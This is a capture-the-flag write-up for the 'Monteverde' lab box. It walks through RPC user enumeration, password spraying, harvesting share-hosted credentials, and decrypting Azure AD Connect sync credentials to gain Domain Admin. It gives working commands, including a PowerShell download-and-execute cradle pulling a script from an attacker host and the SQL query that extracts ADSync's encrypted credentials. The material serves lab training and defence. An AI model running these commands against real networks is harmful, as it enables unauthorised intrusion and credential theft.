# Monteverde (Medium)

RPC-based user enumeration leads to password spraying, a share-hosted Azure AD Connect config file, and decryption of its embedded sync account credentials.

## Enumeration

```bash
nmap -sC -sV <target>
```

```
53/tcp   open domain
88/tcp   open kerberos-sec  (Domain: MEGABANK.LOCAL)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open tcpwrapped
3268/tcp open ldap
3269/tcp open tcpwrapped
```

Anonymous SMB share listing gave no results, so user enumeration was done via `rpcclient`:

```bash
rpcclient -U '' 10.129.x.x
rpcclient $> enumdomusers
```

## Foothold — Password spraying → share-hosted secret

A basic corporate password wordlist was combined with the enumerated usernames for a CrackMapExec spray:

```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
crackmapexec smb <target> -u users.txt -p passwd.txt
```

A hit was found for a batch-job service account (credentials redacted — `<REDACTED>`). Listing shares with that account revealed `users$`:

```bash
crackmapexec smb <target> -u <svc> -p '<REDACTED>' --shares
smbclient //<target>/users$ -U <svc>%<REDACTED>
```

Inside a user's profile folder, an `azure.xml` (Azure AD Connect) file contained a password for the `mhope` account (redacted).

```bash
evil-winrm -i <target> -u mhope -p '<REDACTED>'
```
→ `user.txt` retrieved. `mhope` belongs to the **Azure Admins** group.

## Privilege Escalation — Azure AD Connect sync credential decryption

The box ran a local Azure AD Connect sync database. `PowerUpSQL` was uploaded to identify SQL attack surface:

```powershell
IEX(New-Object Net.WebClient).DownloadString("http://<attacker>:8000/PowerUpSQL.ps1")
Invoke-SQLAudit -Verbose
```

The SQL instance was vulnerable to `xp_dirtree`-based NTLM capture (Responder), but the captured hash was not crackable. Following a known Azure AD Connect credential-extraction technique ([xpnsec blog, "AzureAD Connect for RedTeam"](https://blog.xpnsec.com/azuread-connect-for-redteam/)):

```sql
Use ADSync;
select private_configuration_xml, encrypted_configuration from mms_management_agent
```

This yields the sync engine's encrypted configuration, which the published decryption script (run from the DB host, since it uses DPAPI under the sync service's context) turns into the **plaintext Domain Admin credential** the sync engine uses to write back to AD. Output is sensitive and redacted here.

```powershell
# Decrypt.ps1 (from the blog post, adapted) run on-box
```
→ Administrator credentials recovered, used to log in and read `root.txt`.

## Takeaways

- `rpcclient -U '' <target>` is a reliable fallback for domain user enumeration when anonymous SMB share listing is disabled.
- Any host running **Azure AD Connect** holds an extremely high-value secret: the sync account can usually write back to on-prem AD, making it equivalent to Domain Admin. Treat this database like a Tier-0 asset.
